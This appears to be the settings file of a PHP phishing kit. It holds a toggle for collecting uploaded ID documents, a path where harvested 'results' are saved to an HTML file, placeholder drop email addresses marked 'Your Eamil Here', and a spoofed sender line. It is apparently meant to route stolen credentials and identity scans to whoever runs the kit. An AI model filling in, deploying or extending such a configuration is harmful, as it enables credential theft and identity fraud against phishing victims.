<?php
// to remove ID upload   $id = "0";
$id = "1";
$save = "../../../Result.html"; // file save result
//Your Eamil Here
$to = "example@outlook.com,example@gmail.com";
$from = "DR.KR # <the-day@result.com>"; // from mail
?>